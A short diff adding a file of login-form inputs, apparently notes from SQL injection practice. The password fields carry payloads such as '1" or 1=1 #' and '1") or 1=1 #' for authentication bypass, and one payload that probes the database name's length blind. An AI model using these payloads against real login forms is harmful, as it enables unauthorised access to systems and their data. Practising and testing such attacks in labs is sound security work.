@@ -1,0 +1,12 @@
+User Name:
+Password:1" or 1=1 #
+User Name:
+Password:1" or 1=1 #
+User Name:1
+Password:
+User Name:
+Password:1") or 1=1 #
+User Name:
+Password:1") or 1=1 #
+User Name:
+Password:1") or length(database())=7 #
